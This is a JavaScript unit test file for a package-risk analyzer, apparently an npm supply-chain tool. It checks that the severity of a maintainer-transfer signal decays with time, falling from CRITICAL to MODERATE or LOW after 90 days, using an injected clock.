describe('MAINTAINER_CHANGE time decay boundary', () => {
  const DAY = 24 * 60 * 60 * 1000;
  const AS_OF = new Date('2026-01-01T00:00:00Z').getTime();

  const transferMeta = (daysAgo) => ({
    name: 'boundary-pkg',
    latestVersion: '2.0.0',
    previousVersion: '1.9.0',
    maintainers: [{ name: 'new-owner' }],
    latestPublisher: 'new-owner',
    previousPublisher: 'old-owner',
    maintainerChanged: true,
    hasInstallScripts: false,
    installScripts: {},
    scripts: {},
    dependencies: [],
    addedDeps: [],
    removedDeps: [],
    latestPublishTime: new Date(AS_OF - daysAgo * DAY),
    previousPublishTime: new Date(AS_OF - (daysAgo + 30) * DAY),
    publishIntervalMs: 30 * DAY,
    packageAgeMs: 5 * 365 * DAY,
    majorJump: 0,
    dormancyMs: null,
    versionCount: 40,
    repository: 'https://github.com/example/boundary-pkg',
    license: 'MIT',
  });

  it('transfer 89 days ago is still CRITICAL (recent)', async () => {
    const result = await analyzePackage(transferMeta(89), null, { ecosystem: 'npm', now: AS_OF });
    const signal = result.signals.find(s => s.signal === 'MAINTAINER_CHANGE');
    assert.ok(signal, 'MAINTAINER_CHANGE must fire');
    assert.equal(signal.severity, 'CRITICAL');
    assert.equal(signal.evidence.recentTransfer, true);
  });

  it('transfer 91 days ago decays to MODERATE (small team)', async () => {
    const result = await analyzePackage(transferMeta(91), null, { ecosystem: 'npm', now: AS_OF });
    const signal = result.signals.find(s => s.signal === 'MAINTAINER_CHANGE');
    assert.ok(signal, 'MAINTAINER_CHANGE must fire');
    assert.equal(signal.severity, 'MODERATE');
    assert.equal(signal.evidence.recentTransfer, false);
  });

  it('old transfer in an org-managed package decays to LOW', async () => {
    const meta = transferMeta(91);
    meta.maintainers = [{ name: 'a' }, { name: 'b' }, { name: 'c' }];
    const result = await analyzePackage(meta, null, { ecosystem: 'npm', now: AS_OF });
    const signal = result.signals.find(s => s.signal === 'MAINTAINER_CHANGE');
    assert.equal(signal.severity, 'LOW');
  });

  it('injected clock, not the wall clock, drives the decay', async () => {
    // Same fixture, two different "now" values → two different severities.
    const meta = transferMeta(89);
    const recent = await analyzePackage(meta, null, { ecosystem: 'npm', now: AS_OF });
    const later = await analyzePackage(meta, null, { ecosystem: 'npm', now: AS_OF + 10 * DAY });
    assert.equal(recent.signals.find(s => s.signal === 'MAINTAINER_CHANGE').severity, 'CRITICAL');
    assert.equal(later.signals.find(s => s.signal === 'MAINTAINER_CHANGE').severity, 'MODERATE');
  });
});
